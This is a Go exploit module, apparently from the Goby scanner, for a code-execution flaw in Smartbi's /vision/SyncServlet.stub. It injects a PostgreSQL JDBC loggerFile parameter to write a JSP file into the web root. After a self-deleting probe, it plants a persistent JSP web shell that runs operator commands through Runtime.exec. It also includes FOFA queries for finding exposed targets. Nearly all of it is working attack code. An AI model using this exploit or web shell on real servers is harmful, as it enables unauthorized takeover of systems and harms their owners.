package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Smartbi /vision/SyncServlet.stub file params parameter code execution vulnerability",
    "Description": "<p>Smart software integrates the functional requirements of data analysis and decision support in various industries to meet the big data analysis needs of end users in enterprise-level reports, data visualization analysis, self-service exploration analysis, data mining modeling, AI intelligent analysis and other scenarios.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "SMARTBI",
    "Homepage": "http://www.smartbi.com.cn/",
    "DisclosureDate": "2023-03-01",
    "Author": "su18@javaweb.org",
    "FofaQuery": "(body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\") || body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\"",
    "GobyQuery": "(body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\") || body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.smartbi.com.cn/patchinfo\">https://www.smartbi.com.cn/patchinfo</a></p>",
    "References": [
        "https://wiki.smartbi.com.cn/pages/viewpage.action?pageId=50692623"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Smartbi /vision/SyncServlet.stub 文件 params 参数代码执行漏洞",
            "Product": "SMARTBI",
            "Description": "<p>Smartbi 是思迈特软件推出的商业智能BI软件，满足 BI 产品的发展阶段。思迈特软件整合了各行业的数据分析和决策支持的功能需求，满足最终用户在企业级报表、数据可视化分析、自助探索分析、数据挖掘建模、AI 智能分析等场景的大数据分析需求。<br></p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.smartbi.com.cn/patchinfo\" target=\"_blank\">https://www.smartbi.com.cn/patchinfo</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Smartbi /vision/SyncServlet.stub file params parameter code execution vulnerability",
            "Product": "SMARTBI",
            "Description": "<p>Smart software integrates the functional requirements of data analysis and decision support in various industries to meet the big data analysis needs of end users in enterprise-level reports, data visualization analysis, self-service exploration analysis, data mining modeling, AI intelligent analysis and other scenarios.<br></p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.smartbi.com.cn/patchinfo\" target=\"_blank\">https://www.smartbi.com.cn/patchinfo</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10831"
}`

	exploitSmartBIJDBC2893479252 := func(u *httpclient.FixUrl, fileContent string, fileName string) bool {
		cfg := httpclient.NewPostRequestConfig("/vision/SyncServlet.stub")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		poc := "[[{\"password\":\"\",\"maxConnection\":100,\"user\":\"\",\"driverType\":\"POSTGRESQL\",\"validationQuery\":\"SELECT 1\",\"url\":\"jdbc:postgresql://localhost:5432/test?ApplicationName=xxxuser=test&password=test&loggerLevel=DEBUG&loggerFile=../webapps/smartbi/vision/" + fileName + ".jsp&" + fileContent + "\",\"name\":\"test\",\"driver\":\"org.postgresql.Driver\",\"id\":\"\",\"desc\":\"\",\"alias\":\"\",\"dbCharset\":\"\",\"identifierQuoteString\":\"\\\"\",\"transactionIsolation\":-1,\"validationQueryMethod\":0,\"dbToCharset\":\"\",\"authenticationType\":\"STATIC\",\"driverCatalog\":null,\"extendProp\":\"{\\\"maxWaitConnectionTime\\\":-1,\\\"allowExcelImport\\\":false,\\\"applyToSmartbixDataset\\\":false,\\\"catalogType\\\":\\\"ProductBuiltIn\\\"}\"}]]"
		cfg.Data = "className=DataSourceService&methodName=testConnectionList&params=" + url.QueryEscape(poc)

		_, err := httpclient.DoHttpRequest(u, cfg)
		return err == nil
	}

	checkFileExists904587y3452 := func(u *httpclient.FixUrl, filename string, checkStr string) bool {
		cfg := httpclient.NewGetRequestConfig("/vision/" + filename + ".jsp")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(u, cfg)

		if checkStr != "" {
			return err == nil && strings.Contains(resp.RawBody, checkStr)
		} else {
			return err == nil && resp.StatusCode == 200
		}
	}

	executeCMD120391381 := func(u *httpclient.FixUrl, filename string, cmd string) string {
		cfg := httpclient.NewGetRequestConfig("/vision/" + filename + ".jsp?cmd=" + url.QueryEscape(cmd))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(u, cfg)

		if err == nil && resp.StatusCode == 200 {
			return regexp.MustCompile(`(?s)~~~(.*?)~~~`).FindStringSubmatch(resp.RawBody)[1]
		}

		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr1 := rand.Intn(100) + 1000
			randStr2 := rand.Intn(333) + 100
			flag := randStr1 * randStr2
			randFilename := goutils.RandomHexString(6)
			checkContent := fmt.Sprintf("<%% out.println(%d*%d);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %%>", randStr1, randStr2)
			return exploitSmartBIJDBC2893479252(u, checkContent, randFilename) && checkFileExists904587y3452(u, randFilename, fmt.Sprintf("%d", flag))
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				evilFile := "qweqeqaa"
				cmdShell := "<%out.println(\\\"~~~\\\"+new String(org.apache.commons.io.IOUtils.toByteArray(java.lang.Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream()))+\\\"~~~\\\");%>"
				if !strings.Contains(executeCMD120391381(expResult.HostInfo, evilFile, "echo c4ca4238a0b923820dcc509a6f75849b"), "c4ca4238a0b923820dcc509a6f75849b") {
					if exploitSmartBIJDBC2893479252(expResult.HostInfo, cmdShell, evilFile) {

						for i := 0; i < 10; i++ {
							if strings.Contains(executeCMD120391381(expResult.HostInfo, evilFile, "echo c4ca4238a0b923820dcc509a6f75849b"), "c4ca4238a0b923820dcc509a6f75849b") {
								break
							}
						}
					}
				}

				if result := executeCMD120391381(expResult.HostInfo, evilFile, cmd); result != "" {
					expResult.Output = result
					expResult.Success = true
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的使用方式"
			}
			return expResult
		},
	))
}
